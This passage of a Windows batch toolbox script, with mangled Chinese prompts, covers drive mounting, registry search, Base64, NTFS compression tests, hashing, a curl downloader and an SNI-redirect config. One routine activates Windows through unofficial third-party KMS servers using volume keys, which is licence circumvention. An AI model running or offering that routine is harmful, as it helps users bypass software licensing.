	>nul 2>nul dir /a:d /b "!xzpf!"||md "!xzpf!"
)
mountvol !xzpf! !b%cjpf%!
if not errorlevel 1 (echo;�������)
%hx%
%pause%
endlocal
goto 61
:61.5
title ɾ���̷�(ɾ����װ���)!system!
cls
call :sypf sypf
echo;!sypf!
%hx%
set scpf=
set /p "scpf=������Ҫɾ�����̷���·��: "
call :var scpf
if not defined scpf (endlocal&goto 61)
if "!scpf:~1!" equ "" (set "scpf=!scpf!:")
mountvol !scpf! /d
if not errorlevel 1 (echo;�������)
%hx%
%pause%
endlocal
goto 61
:61.6
title ΪEFI���������̷�!system!
cls
echo;����ԱȨ�޴�����EFI�����̷�ֻ���й���ԱȨ�޵Ľ��̿ɼ�
set xzpf=
set /p "xzpf=��������EFI�������̷���·��: "
call :var xzpf
if not defined xzpf (endlocal&goto 61)
if "!xzpf:~1!" equ "" (set "xzpf=!xzpf!:")
mountvol !xzpf! /s
if not errorlevel 1 (echo;�������)
%hx%
%pause%
endlocal
goto 61
:62
setlocal
title ע�������!system!
cls
set zcbss=
set /p "zcbss=������Ҫ����������: "
call :var zcbss
%hx%
echo;(1/5)��HKEY_CLASSES_ROOT������...
reg query hkcr /f "!zcbss!" /s
%hx%
echo;(2/5)��HKEY_CURRENT_USER������...
reg query hkcu /f "!zcbss!" /s
%hx%
echo;(3/5)��HKEY_LOCAL_MACHINE������...
reg query hklm /f "!zcbss!" /s
%hx%
echo;(4/5)��HKEY_USERS������...
reg query hku /f "!zcbss!" /s
%hx%
echo;(5/5)��HKEY_CURRENT_CONFIG������...
reg query hkcc /f "!zcbss!" /s
%hx%
%pause%
endlocal
goto memuv2
:63
setlocal
title Base�����!system!
cls
if not exist "!windir!\system32\certutil.exe" (
	echo;û���ҵ�certutil.exe
	echo;���ܼ���Base�����
	%hx%
	%pause%
	endlocal
	goto memuv2
)
%hx%
for %%a in (
	"[1]Base64����"
	"[2]Base64����"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (goto 63-1)
if "!shuru!" equ "2" (goto 63-2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 63
:63-1
cls
if exist "%temp%\codetmp" (del /f /q "%temp%\codetmp")
title Base64����!system!
set basebm=
set /p "basebm=����Ҫ������ַ������ļ�·��: "
call :var basebm
if not defined basebm (goto 63-1)
if not exist "!basebm!" (
	>"%temp%\tmp" echo;!basebm!
	>nul certutil -decode -f "%temp%\tmp" "%temp%\codetmp"
	goto 63-11
)
call :ljjc basebm dir||(
	<nul set /p "=���ܽ����ļ���"
	call :out 2
	goto 63-1
)
:63-12
>nul certutil -decode -f "!basebm!" "%temp%\codetmp"
:63-11
cls
%hx%
echo;��������: !basebm!
echo;��������:
if exist "%temp%\codetmp" (type "%temp%\codetmp") else (echo;����ʧ��)
echo;
%hx%
set bxz=
set /p "bxz=����y�������,�������뷵���ϼ��˵�: "
call :var bxz
if "!bxz!" equ "y" (
	set basebc=
	set /p "basebc=���뱣��·��:"
	call :var basebc
	call :lj basebc basebc
	%hx%
	copy /y /z "%temp%\codetmp" "!basebc!"
	if errorlevel 1 (echo;����ʧ��) else (echo;����ɹ�)
	%hx%
	%pause%
)
del /f /q "%temp%\tmp";"%temp%\codetmp"
endlocal
goto 63
:63-2
cls
if exist "%temp%\codetmp" (del /f /q "%temp%\codetmp")
title Base64����!system!
set basebm=
set /p "basebm=����Ҫ������ַ������ļ�·��: "
if not defined basebm! (goto 63-2)
if not exist "!basebm!" (
	>"%temp%\tmp" <nul set /p "=!basebm!"
	>nul certutil -encode -f "%temp%\tmp" "%temp%\codetmp"
	goto 63-21
)
call :ljjc basebm dir||(
	<nul set /p "=���ܽ����ļ���"
	call :out 2
	goto 63-2
)
:63-22
>nul certutil -encode -f "!basebm!" "%temp%\codetmp"
:63-21
cls
%hx%
echo;��������: !basebm!
echo;��������:
for /f "delims=" %%a in (%temp%\codetmp) do (
	if "%%a" neq "-----BEGIN CERTIFICATE-----" (
		if "%%a" neq "-----END CERTIFICATE-----" (echo;%%a)
	)
)
%hx%
set bxz=
set /p "bxz=����y�������,�������뷵���ϼ��˵�: "
call :var bxz
if "!bxz!" equ "y" (
	set basebc=
	set /p "basebc=���뱣��·��: "
	call :var basebc
	call :lj basebc basebc
	%hx%
	copy /y /z "%temp%\codetmp" "!basebc!"
	if errorlevel 1 (echo;����ʧ��) else (echo;����ɹ�)
	%hx%
	%pause%
)
del /f /q "%temp%\tmp";"%temp%\codetmp"
endlocal
goto 63
:64
setlocal
title 8.3���ļ�������!system!
cls
%hx%
for %%a in (
	"[1]��ѯ8.3���ļ���״̬"
	"[2]��ֹ8.3���ļ�������"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (goto 64-1)
if "!shuru!" equ "2" (goto 64-2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 64
:64-1
cls
call :sypf sypf
echo;!sypf!
set query83=
set /p "query83=����Ҫ��ѯ���̷�: "
call :var query83
fsutil 8dot3name query !query83!:
%hx%
%pause%
endlocal
goto 64
:64-2
cls
fsutil 8dot3name set 1
%hx%
%pause%
endlocal
goto 64
:65
setlocal
title ����NTFSѹ��!system!
cls
set url=
set /p "url=����Ҫѹ�����ļ���: "
call :ljjc url dir&&(
	<nul set /p "=·�� !url! ����һ���ļ���"
	call :out 2
	goto 65
)
for /f "delims=" %%a in ("!url!") do (
	call :isntfs %%~da&&(
		<nul set /p "=%%~da ����һ��NTFS����"
		call :out 2
		goto 65
	)
)
for %%a in (
	listfile.log
	loadtime.log
	uncompact.log
) do (
	if exist "%temp%\%%a" (del /f /q "%temp%\%%a")
)
title ��¼�ļ��б�...
for /f "delims=" %%a in ('dir /a /s /b "!url!"') do (
	echo;"%%a" %%~za %%~xa
	call :listfile "%%a" %%~za %%~xa
)
title ������Ƭ...
defrag "!url!" /u /v
echo;ֹͣsysmain������ջ���...
set sysmain=
for /f "tokens=3 delims=: " %%a in ('sc query sysmain') do (
	if /i "%%a" equ "running" (set sysmain=1)
)
if defined sysmain(
	>nul 2>nul sc stop sysmain 4:5:2 "DOS������ - ����NTFSѹ�� - ��ջ���"
)
call :pwiex clearcache
title ��¼�ļ�ѹ��ǰ�Ķ�ȡʱ��...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (call :loadfile %%a)
title ѹ���ļ�...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (compact /c %%a)
title ������Ƭ...
defrag "!url!" /u /v
echo;��ջ���...
call :pwiex clearcache
title �Ƚ�ѹ��ǰ��Ķ�ȡʱ��...
for /f "tokens=*" %%a in (%temp%\loadtime.log) do (call :ifloadfile %%a)
title ��ѹ���ʺ�ѹ�����ļ�...
for /f "tokens=*" %%a in (%temp%\uncompact.log) do (compact /u %%a)
title ����NTFSѹ��!system!
if "!sysmain!" equ "1" (>nul 2>nul net start sysmain)
del /f /q "%temp%\listfile.log";^
		"%temp%\loadtime.log";^
		"%temp%\uncompact.log"
%hx%
%pause%
endlocal
goto memuv2
:ifloadfile
set "file=%~1"
set "loadtime=%2"
call :copyfile "!file!"
if !raw! geq !loadtime! (>>"%temp%\uncompact.log" echo;"!file!")
goto :eof
:loadfile
set "file=%~1"
call :copyfile "!file!"
>>"%temp%\loadtime.log" echo;"!file!" !raw!
goto :eof
:copyfile
set "file=%~1"
echo;"!file!"
set "kssj=!time!"
copy /z "!file!" nul
set "jssj=!time!"
call :sjc !kssj! !jssj! raw
echo;��ȡ��ʱ: !raw! ms
goto :eof
:listfile
>nul 2>nul dir /a:d /b "%~1"||(
	if %2 gtr 4096 (
		if !size! leq 104857600 (
			for %%a in (
				.7z .ogg .mpg .gif .zip .rar .png .jpg .wmf .wmv .bik .bk2 .mp3
				.acc .m4a .ape .mp4 .avi .flv .f4v .mkv .3gp .cab .pdf .jpeg .flac
			) do (
				if /i "%3" equ "%%a" (goto :eof)
			)
			>>"%temp%\listfile.log" echo;"%~1"
		)
	)
)
goto :eof
#clearcache#
$Source = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
namespace ClearStandbyList
{
	public class Program
	{
		const int SE_PRIVILEGE_ENABLED = 2;
		const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
		const string SE_PROFILE_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
		const int SystemFileCacheInformation = 0x0015;
		const int SystemMemoryListInformation = 0x0050;
		const int MemoryPurgeStandbyList = 4;
		[DllImport("advapi32.dll", SetLastError = true)]
		internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
		[DllImport("advapi32.dll", SetLastError = true)]
		internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
		[DllImport("ntdll.dll")]
		public static extern UInt32 NtSetSystemInformation(int InfoClass, IntPtr Info, int Length);
		public static bool Is64BitMode()
		{
			return Marshal.SizeOf(typeof(IntPtr)) == 8;
		}
		static void Main(string[] args)
		{
			ClearFileSystemCache(true);
		}
		public static void ClearFileSystemCache(bool ClearStandbyCache)
		{
			try
			{
				if (SetIncreasePrivilege(SE_INCREASE_QUOTA_NAME))
				{
					uint num1;
					int SystemInfoLength;
					GCHandle gcHandle;
					if (!Is64BitMode())
					{
						SYSTEM_CACHE_INFORMATION cacheInformation = new SYSTEM_CACHE_INFORMATION();
						cacheInformation.MinimumWorkingSet = uint.MaxValue;
						cacheInformation.MaximumWorkingSet = uint.MaxValue;
						SystemInfoLength = Marshal.SizeOf(cacheInformation);
						gcHandle = GCHandle.Alloc(cacheInformation, GCHandleType.Pinned);
						num1 = NtSetSystemInformation(SystemFileCacheInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
						gcHandle.Free();
					}
					else
					{
						SYSTEM_CACHE_INFORMATION_64_BIT information64Bit = new SYSTEM_CACHE_INFORMATION_64_BIT();
						information64Bit.MinimumWorkingSet = -1L;
						information64Bit.MaximumWorkingSet = -1L;
						SystemInfoLength = Marshal.SizeOf(information64Bit);
						gcHandle = GCHandle.Alloc(information64Bit, GCHandleType.Pinned);
						num1 = NtSetSystemInformation(SystemFileCacheInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
						gcHandle.Free();
					}
					if (num1 != 0)
						throw new Exception("NtSetSystemInformation(SYSTEMCACHEINFORMATION) error: ", new Win32Exception(Marshal.GetLastWin32Error()));
				}
				if (ClearStandbyCache && SetIncreasePrivilege(SE_PROFILE_SINGLE_PROCESS_NAME))
				{
					int SystemInfoLength = Marshal.SizeOf(MemoryPurgeStandbyList);
					GCHandle gcHandle = GCHandle.Alloc(MemoryPurgeStandbyList, GCHandleType.Pinned);
					uint num2 = NtSetSystemInformation(SystemMemoryListInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
					gcHandle.Free();
					if (num2 != 0)
						throw new Exception("NtSetSystemInformation(SYSTEMMEMORYLISTINFORMATION) error: ", new Win32Exception(Marshal.GetLastWin32Error()));
				}
			}
			catch (Exception ex)
			{
				Console.Write(ex.ToString());
			}
		}
		private static bool SetIncreasePrivilege(string privilegeName)
		{
			using (WindowsIdentity current = WindowsIdentity.GetCurrent(TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges))
			{
				TokPriv1Luid newst;
				newst.Count = 1;
				newst.Luid = 0L;
				newst.Attr = SE_PRIVILEGE_ENABLED;
				if (!LookupPrivilegeValue(null, privilegeName, ref newst.Luid))
					throw new Exception("Error in LookupPrivilegeValue: ", new Win32Exception(Marshal.GetLastWin32Error()));
				int num = AdjustTokenPrivileges(current.Token, false, ref newst, 0, IntPtr.Zero, IntPtr.Zero) ? 1 : 0;
				if (num == 0)
					throw new Exception("Error in AdjustTokenPrivileges: ", new Win32Exception(Marshal.GetLastWin32Error()));
				return num != 0;
			}
		}
	}
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	struct SYSTEM_CACHE_INFORMATION
	{
		public uint CurrentSize;
		public uint PeakSize;
		public uint PageFaultCount;
		public uint MinimumWorkingSet;
		public uint MaximumWorkingSet;
		public uint Unused1;
		public uint Unused2;
		public uint Unused3;
		public uint Unused4;
	}
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	struct SYSTEM_CACHE_INFORMATION_64_BIT
	{
		public long CurrentSize;
		public long PeakSize;
		public long PageFaultCount;
		public long MinimumWorkingSet;
		public long MaximumWorkingSet;
		public long Unused1;
		public long Unused2;
		public long Unused3;
		public long Unused4;
	}
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct TokPriv1Luid
	{
		public int Count;
		public long Luid;
		public int Attr;
	}
}
"@
Add-Type -TypeDefinition $Source -Language CSharp
[ClearStandbyList.Program]::ClearFileSystemCache($true)
#clearcache#
:66
setlocal
title �����ļ���ϣֵ!system!
cls
set url=
set /p "url=�����ļ�·��(e=���ز˵�): "
if /i "!url!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc url&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 66
)
cls
echo;�ļ�:		"!url!"
for /f "delims=" %%a in ("!url!") do (
	if %%~za gtr 1024 (
		call :xdwjs %%~za b dw
		echo;�ļ���С:	!dw! %%~za �ֽ�
	) else (
		echo;�ļ���С:	%%~za �ֽ�
	)
)
call :hash "!url!" md5 hash
call :convertu !hash! hash
echo;
echo;MD5:	 !hash!
call :hash "!url!" sha1 hash
call :convertu !hash! hash
echo;SHA-1:	 !hash!
call :hash "!url!" sha256 hash
call :convertu !hash! hash
echo;SHA-256: !hash!
%hx%
%pause%
endlocal
goto memuv2
:67
setlocal
cls
title ���������̷�!system!
echo;�����̷�ֻ���ڵ�ǰDOS�������ڷ���
%hx%
for %%a in (
	"[1]��·�����̷�����"
	"[2]ɾ�������̷�"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (goto 67.1)
if "!shuru!" equ "2" (goto 67.2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 67
:67.1
title ��·�����̷�����!system!
cls
call :sypf sypf
echo;��ǰ�����̷�: !sypf!
echo;�����̷�:
subst
%hx%
set newpf=
set /p "newpf=����Ҫ���������̷�:"
set gllj=
set /p "gllj=����Ҫ������·��: "
call :var newpf
call :var gllj
call :ljjc gllj dir&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 67
)
subst !newpf!: !gllj!||(
	<nul set /p "=����ʧ��"
	call :out 2
	endlocal
	goto 67
)
<nul set /p "=�����ɹ�"
call :out 2
endlocal
goto 67
:67.2
title ɾ�������̷�!system!
cls
echo;�����̷�:
subst
%hx%
set xzxnp=
set /p "xzxnp=����Ҫж�ص��̷�: "
call :var xzxnp
subst !xzxnp!: /d||(
	<nul set /p "=ж��ʧ��"
	call :out 2
	endlocal
	goto 67
)
<nul set /p "=ж�سɹ�"
call :out 2
endlocal
goto 67
:68
setlocal
title ��ѹmsi��װ�ļ�!system!
cls
set msiurl=
set /p "msiurl=����msi�ļ�·��(e=���ز˵�): "
call :var msiurl
if /i "!msiurl!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc msiurl&&(
	<nul set /p "=��Ч·��"
	call :out 2
	endlocal
	goto 68
)
for /f "delims=" %%a in ("!msiurl!") do (
	if /i "%%~xa" neq ".msi" (
		<nul set /p "=����msi�ļ�"
		call :out 2
		endlocal
		goto 68
	)
)
set msidir=
set /p "msidir=����msi�ļ���ѹ·��(���ܽ�ѹ���Ѵ��ڵ��ļ���, Ĭ��·��Ϊmsi�ļ�����·��)(e=���ز˵�): "
call :var msidir
if /i "!msidir!" equ "e" (
	endlocal
	goto memuv2
)
if not defined msidir (
	for /f "delims=" %%a in ("!msiurl!") do (set "msidir=%%~dpna")
)
call :lj msidir msidir
echo;��ʼ��ѹ...
if exist "!msidir!" (
	echo;���ܽ�ѹ���Ѵ��ڵ��ļ���
) else (
	msiexec /a "!msiurl!" /quiet /passive /qn targetdir="!msidir!"
)
%hx%
%pause%
endlocal
goto memuv2
:69
setlocal
title ����CMD����̨ɫ�ʱ�!system!
cls
color 07
set cs=0
for /l %%a in (40,1,47) do (
	for /l %%b in (90,1,97) do (
		if "%%a" equ "40" (
			set bj=0
		) else (
			if "%%a" equ "41" (
				set bj=4
			) else (
				if "%%a" equ "42" (
					set bj=2
				) else (
					if "%%a" equ "43" (
						set bj=6
					) else (
						if "%%a" equ "44" (
							set bj=1
						) else (
							if "%%a" equ "45" (
								set bj=5
							) else (
								if "%%a" equ "46" (
									set bj=3
								) else (
									if "%%a" equ "47" (
										set bj=7
									)
								)
							)
						)
					)
				)
			)
		)
		if "%%b" equ "90" (
			set zt=8
		) else (
			if "%%b" equ "91" (
				set zt=c
			) else (
				if "%%b" equ "92" (
					set zt=a
				) else (
					if "%%b" equ "93" (
						set zt=e
					) else (
						if "%%b" equ "94" (
							set zt=9
						) else (
							if "%%b" equ "95" (
								set zt=d
							) else (
								if "%%b" equ "96" (
									set zt=b
								) else (
									if "%%b" equ "97" (
										set zt=f
									)
								)
							)
						)
					)
				)
			)
		)
		if !cs! lss 7 (
			<nul set /p "=!cswz!%%b;%%am  !bj!!zt!  !cswz!0m"
			set /a "cs+=1"
		) else (
			echo;!cswz!%%b;%%am  !bj!!zt!  !cswz!0m
			set cs=0
		)
	)
)
set cs=0
for /l %%a in (40,1,47) do (
	for /l %%b in (90,1,97) do (
		if !cs! lss 7 (
			<nul set /p "=!cswz!%%b;%%am %%b;%%a!cswz!0m"
			set /a "cs+=1"
		) else (
			echo;!cswz!%%b;%%am %%b;%%a!cswz!0m
			set cs=0
		)
	)
)
for /l %%a in (90,1,97) do (
	for /l %%b in (40,1,47) do (
		if !cs! lss 7 (
			<nul set /p "=!cswz!%%b;%%am %%b;%%a!cswz!0m"
			set /a "cs+=1"
		) else (
			echo;!cswz!%%b;%%am %%b;%%a!cswz!0m
			set cs=0
		)
	)
)
<nul set /p "=!cswz!s!cswz!27;0H"
for /l %%b in (1,1,4) do (
	echo;
	for /l %%a in (255,-13,0) do (<nul set /p "=!cswz!48;2;255;0;%%am !cswz!0m")
	for /l %%a in (0,13,255) do (<nul set /p "=!cswz!48;2;255;%%a;0m !cswz!0m")
	for /l %%a in (255,-13,0) do (<nul set /p "=!cswz!48;2;%%a;255;0m !cswz!0m")
	for /l %%a in (0,13,255) do (<nul set /p "=!cswz!48;2;0;255;%%am !cswz!0m")
	for /l %%a in (255,-13,0) do (<nul set /p "=!cswz!48;2;0;%%a;255m !cswz!0m")
	for /l %%a in (0,13,255) do (<nul set /p "=!cswz!48;2;%%a;0;255m !cswz!0m")
)
<nul set /p "=!cswz!u"
%hx%
%pause%
endlocal
goto memuv2
:70
setlocal
title KMS����Windows!system!
cls
for %%a in (
	"Core=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99"
	"CoreCountrySpecific=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR"
	"CoreN=3KHY7-WNT83-DGQKR-F7HPR-844BM"
	"CoreSingleLanguage=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
	"ProfessionalStudent=YNXW3-HV3VB-Y83VG-KPBXM-6VH3Q"
	"ProfessionalStudentN=8G9XJ-GN6PJ-GW787-MVV7G-GMR99"
	"Professional=W269N-WFGWX-YVC9B-4J6C9-T83GX"
	"ProfessionalN=MH37W-N47XK-V7XM9-C7227-GCQG9"
	"ProfessionalSN=8Q36Y-N2F39-HRMHT-4XW33-TCQR4"
	"ProfessionalWMC=NKPM6-TCVPT-3HRFX-Q4H9B-QJ34Y"
	"Enterprise=NPPR9-FWDCX-D2C8J-H872K-2YT43"
	"EnterpriseN=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4"
	"Education=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
	"EducationN=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ"
	"EnterpriseS=WNMTR-4C88C-JK8YV-HQ7T2-76DF9"
	"EnterpriseSN=2F77B-TNFGY-69QQF-B8YKP-D69TJ"
) do (
	>nul 2>nul set "%%~a"
)
for /f "skip=2 tokens=3" %%a in ('"2>nul reg QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v EditionID"') do (
	set "sysid=%%a"
)
set server=
if defined !sysid! (echo;ϵͳ����: !system:~3!) else (call :colortxt c û�е�ǰϵͳ�ļ�����Կ&echo;)
>nul ping /4 /n 1 www.baidu.com||call :colortxt c û����������&echo;
echo;ѡ��KMS������
%hx%
for %%a in (
	"[1]kms.loli.best"
	"[2]kms.03k.org"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (set "server=kms.loli.best"&goto 70.1)
if "!shuru!" equ "2" (set "server=kms.03k.org"&goto 70.1)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��Ч����"
call :out 2
endlocal
goto 70
:70.1
cls
<nul set /p "=KMS������: "
call :colortxt a !server!
echo;
<nul set /p "=ϵͳ����: "
call :colortxt a "!system:~3!"
echo;
if defined sysid (cscript //Nologo %windir%\system32\slmgr.vbs /ipk !%sysid%!)
cscript //Nologo %windir%\system32\slmgr.vbs /skms !server!
cscript //Nologo %windir%\system32\slmgr.vbs /ato
start slmgr.vbs -xpr
%hx%
echo;�����ʾ����ʧ��[����: 0xC004F074]��Ӧ����KMS������.
%pause%
endlocal
goto memuv2
:71
setlocal
title curl���������!system!
cls
if not exist "!windir!\system32\curl.exe" (
	if not exist "curl.exe" (
		<nul set /p "=û���ҵ�curl.exe"
		call :out 2
		endlocal
		goto memuv2
	)
)
:71.1
cls
set "doh=--doh-url https://101.101.101.101/dns-query"
set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36""
set filename=
set url=
set /p "url=������������(e=����): "
if not defined url (
	<nul set /p "=���Ӳ���Ϊ��!"
	call :out 2
	goto 71.1
)
if /i "!url!" equ "e" (
	endlocal
	goto memuv2
)
set tr=
set /p "tr=�������ؽ�����(Ĭ��16): "
if not defined tr (set tr=16)
call :checkvar tr num&&(
	<nul set /p "=ֻ������������!"
	call :out 2
	goto 71.1
)
set dir=
set /p "dir=���뱣��·��(Ĭ�ϵ�ǰDOS����������·��): "
if not defined dir (set "dir=%~dp0")
call :ljjc dir dir&&(
	<nul set /p "=·����Ч"
	call :out 2
	goto 71.1
)
cls
echo;����:	!url!
echo;��ʼ��ȡ�ļ���Ϣ...
set filename=
if exist "%temp%\tag" (del /f /q "%temp%\tag")
call :curlproxy
curl !proxy! !doh! !ua! -I -# -L --remove-on-error -o tag --connect-timeout 5 --max-time 10 --output-dir "%temp%" "!url!"
if not exist "%temp%\tag" (
	echo;û�л�ȡ���ļ���Ϣ
	%hx%
	%pause%
	endlocal
	goto memuv2
)
for /f "tokens=2" %%a in ('findstr /c:"Accept-Ranges:" "%temp%\tag"') do (set "trflag=%%a")
for /f "tokens=2" %%a in ('findstr /c:"Content-Length:" "%temp%\tag"') do (set "filesize=%%a")
for /f "tokens=2 delims==" %%a in ('findstr /c:"filename=" "%temp%\tag"') do (set "filename=%%a")
del /f /q "%temp%\tag"
if "!trflag!" neq "bytes" (set tr=1)
if defined filesize (
	if !filesize! geq 1024 (
		call :xdwjs !filesize! b dw
		set "dw=!filesize! �ֽ� Լ!dw!"
	) else (
		set "dw=!filesize! �ֽ�"
	)
) else (
	set "dw=δ֪ (תΪ����������)"
	set tr=1
)
if not defined filename (
	set /p "filename=�����ļ���: "
	if not defined filename (set filename=curl�����ļ�)
)
set fd=
2>nul set /a "fd=filesize/tr"
if not defined fd (set fd=0)
set xfd=
if !fd! geq 1024 (
	call :xdwjs !fd! b xfd
	set "xfd=!fd! �ֽ� Լ!xfd!"
) else (
	set "xfd=!fd! �ֽ�"
)
set ys=
2>nul set /a "ys=filesize%%tr"
if not defined ys (set ys=0)
set xys=
if "!ys!" neq "0" (set "xys= + !ys! �ֽ�")
set oldfd=0
set /a "pdtr=tr-1"
set /a "newfd=fd-1"
set /a "pdfd=fd+ys"
set /a "newtr=tr+1"
set file=
for /l %%a in (1,1,!tr!) do (set "file=!file!%%a+")
set "file=!file:~0,-1!"
cls
echo;�ļ���:		!filename!
echo;�ļ���С:	!dw!
if "!trflag!" neq "bytes" (echo;�����Ӳ�֧�ֶ��̴߳���,�������Զ�����Ϊ1)
echo;������:		!tr!
echo;����Ƭ�δ�С:	!xfd!!xys!
echo;����·��:	!dir!
%hx%
<nul set /p "=���������ʼ����"&>nul pause
cls
echo;��ʼ�����ļ�...
if not defined filesize (goto 71.3)
if "!tr!" equ "1" (goto 71.3)
title curl��������� - �ȴ��ļ��������(��e���ز˵�)!system!
call :md "%temp%\down"||(
	echo;���ܴ�����ʱ�ļ���: "%temp%\down"
	call :out 2
	endlocal
	goto memuv2
)
set "kssj=!time!"
for /l %%a in (1,1,!tr!) do (
	start /min /low "curl���������_%%a" ^
	curl !proxy! !doh! !ua! -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir "%temp%\down" "!url!"
	set /a "oldfd=newfd+1"
	if "%%a" equ "!pdtr!" (set newfd=) else (set /a "newfd=oldfd+fd-1")
)
pushd "%temp%\down"
cls
:71.2
(
cls
<nul set /p "=!cswz!s!cswz!0;0H"
set jccs=
set jingdu=
<nul set /p "=!cswz!0;76H"
call :colortxt a �ȴ��ļ��������[��e���ز˵�]...
<nul set /p "=!cswz!u"
)
for /l %%a in (1,1,!tr!) do (
	set "ssdx=%%~za"
	if not defined ssdx (set ssdx=0)
	if "%%a" equ "!tr!" (
		if "!ssdx!" equ "!pdfd!" (
			echo;����%%a���
			set /a "jccs+=1"
		) else (
			set fhz=
			call :cf !ssdx! !pdfd! 2 fhz
			set "jcjd=!fhz:~2,2!"
			if "!jcjd:~0,1!" equ "0" (set "jcjd=!jcjd:~1,1!")
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (set "jdt=!jdt!:")
			<nul set /p "=����%%a�Ľ���:	["
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	) else (
		if "!ssdx!" equ "!fd!" (
			echo;����%%a���
			set /a "jccs+=1"
		) else (
			set fhz=
			call :cf !ssdx! !fd! 2 fhz
			set "jcjd=!fhz:~2,2!"
			if "!jcjd:~0,1!" equ "0" (set "jcjd=!jcjd:~1,1!")
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (set "jdt=!jdt!:")
			<nul set /p "=����%%a�Ľ���:	["
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	)
)
>nul choice /c 1e /t 1 /d 1
if "!errorlevel!" equ "2" (
	taskkill /fi "windowtitle eq curl���������_*" /fi "imagename eq curl.exe" /f
	popd
	rd /s /q "%temp%\down"
	endlocal
	goto memuv2
)
if "!jccs!" neq "!tr!" (
	set nocurl=
	for /l %%a in (1,1,!tr!) do (
		for /f "tokens=1 delims=," %%a in ('tasklist /fi "imagename eq curl.exe" /fi "windowtitle eq curl���������_%%a" /fo csv /nh') do (
			if /i "%%~a" neq "curl.exe" (set /a "nocurl+=1")
		)
	)
	if "!nocurl!" neq "!tr!" (goto 71.2)
)
set "jssj=!time!"
cls
echo;�ϲ��ļ���...
copy /b /z !file! "!dir!\!filename!"
popd
rd /s /q "%temp%\down"
:71.4
cls
title curl���������!system!
if exist "!dir!\!filename!" (
	for /f "delims=" %%a in ("!dir!\!filename!") do (
		echo;���������ٶ�...
		call :sjc !kssj! !jssj! raw
		call :sjc !kssj! !jssj! xzys format
		call :div !raw! 1000 3 xzsd
		call :div %%~za !xzsd! 3 sd
		call :xdwjs !sd! d dw
		call :bel
		cls
		echo;�������
		echo;����:		!url!
		echo;��ʱ:		!xzys!
		echo;ƽ�������ٶ�:	!dw!/s
		echo;�ļ�:		%%~nxa
		if %%~za geq 1024 (
			call :xdwjs %%~za b dw
			echo;�ļ���С:	%%~za �ֽ� Լ!dw!
		) else (
			echo;�ļ���С:	%%~za �ֽ�
		)
		echo;����·��:	%%~dpa
	)
) else (
	call :bel
	cls
	echo;����:	!url!
	echo;����ʧ��
)
%hx%
%pause%
endlocal
goto memuv2
:71.3
call :lj dir dir
set "kssj=!time!"
curl !proxy! !doh! !ua! --compressed -# -R --remove-on-error -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o "!filename!" --output-dir "!dir!" "!url!"
set "jssj=!time!"
goto 71.4
:72
setlocal
if not exist "!temp!\sni.ini" (
	>"!temp!\sni.ini" (
	rem ʹ�� @ ��������е� * ͨ���
	for %%a in (
		"[�����ض���]"

		"#wikipedia"
		"@.wikipedia.org=wikidata.org"
		"@.wikiquote.org=wikidata.org"
		"@.wikinews.org=wikidata.org"
		"@.wikibooks.org=wikidata.org"
		"@.wiktionary.org=wikidata.org"
		"@.wikisource.org=wikidata.org"
		"@.wikivoyage.org=wikidata.org"
		"@.wikiversity.org=wikidata.org"

		"#pixiv"
		"pixiv.net=pixiv.me"
		"@.pixiv.net=pixiv.me"
		"@.pximg.net=pximg.net"

		"#protonmail"
		"proton.me=pr.tn"
		"account.proton.me=a.pr.tn"
		"account-api.proton.me=b.pr.tn"
